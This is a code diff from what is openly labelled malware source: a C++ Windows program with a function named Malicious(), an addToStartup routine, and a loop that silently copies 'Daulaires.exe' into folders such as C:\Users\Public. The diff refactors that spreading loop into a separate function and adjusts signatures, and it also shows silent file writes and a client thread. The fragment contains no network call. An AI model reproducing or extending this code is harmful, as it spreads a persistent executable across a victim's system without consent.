@@ -2,16 +2,10 @@
 
 using namespace std;
 
-auto Main::Windows() -> bool
-{
-    Info info;
-    Utils utils;
-    Memory Memory;
-    map<string, function<void()>> commands;
+auto scanThroughDirs() -> void {
 
-    utils.DisplayText(info.getCurrentDirectory());
-    utils.DisplayText(info.getSystemArchitecture());
-    utils.DisplayText(info.getSystemType());
+    Memory Memory;
+    Info Info;
     map<string, string> paths;
     // app different paths to the map
     paths["C:\\Users\\Public\\"] = "C:\\Users\\Public\\";
@@ -28,8 +22,21 @@ auto Main::Windows() -> bool
     for (const auto& path : paths) {
         // convert the path to a string before adding the file name
         string pathString = path.second;
-        Memory.SilentMoveFile("Daulaires.exe", info.getCurrentDirectory(), pathString);
-	};
+        Memory.SilentMoveFile("Daulaires.exe", Info.getCurrentDirectory(), pathString);
+    };
+};
+
+auto Main::Windows() -> bool
+{
+    Info info;
+    Utils utils;
+    Memory Memory;
+    map<string, function<void()>> commands;
+
+    utils.DisplayText(info.getCurrentDirectory());
+    utils.DisplayText(info.getSystemArchitecture());
+    utils.DisplayText(info.getSystemType());
+
 
     Memory.SilentWriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
 
@@ -145,7 +152,7 @@ void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
     }
 };
 
-void Malicious() {
+auto Malicious() -> void {
     map<string, string> paths;
     // app different paths to the map
     paths["C:\\Users\\Public\\"] = "C:\\Users\\Public\\";
@@ -170,8 +177,10 @@ void Malicious() {
 };
 
 int main() {
+
     Info Info;
     Main Main{};
+    
     auto name = Info.assignName();
     // allow another console to run the client
     std::thread clientThread([&]() {
